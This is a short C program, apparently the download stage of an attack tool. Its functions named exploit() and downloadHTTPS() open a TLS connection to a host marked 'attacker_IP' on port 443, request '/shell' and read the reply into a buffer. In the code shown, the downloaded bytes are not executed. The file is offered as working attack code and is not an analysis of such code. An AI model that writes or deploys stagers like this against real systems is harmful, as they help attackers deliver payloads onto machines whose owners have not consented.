#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <openssl/ssl.h>
#include <arpa/inet.h>

#define BUFFER_SIZE 1024

char buffer[BUFFER_SIZE];
char ip[] = "10.10.10.10"; //attacker_IP
int port = 443;


int downloadHTTPS()
{
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);

    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);

    inet_aton(ip, &addr.sin_addr); //linux

    connect(sockfd, (struct sockaddr *)&addr, sizeof(addr));

    SSL_CTX* ctx = SSL_CTX_new(TLS_method());
    SSL* ssl = SSL_new(ctx);
    
    SSL_set_mode(ssl, SSL_MODE_AUTO_RETRY);
    SSL_set_read_ahead(ssl, 1);

    SSL_set_fd(ssl, sockfd);
    SSL_connect(ssl);
    char* request = "GET /shell\r\n\r\n";
    SSL_write(ssl, request, strlen(request));
    
    int nb = SSL_read(ssl, buffer, BUFFER_SIZE);
    
    close(sockfd);

    return nb;
}

void exploit()
{
    int nb = downloadHTTPS();
    //printf("%d\n", nb);
}


int main()
{
    exploit();
    return 0;
}
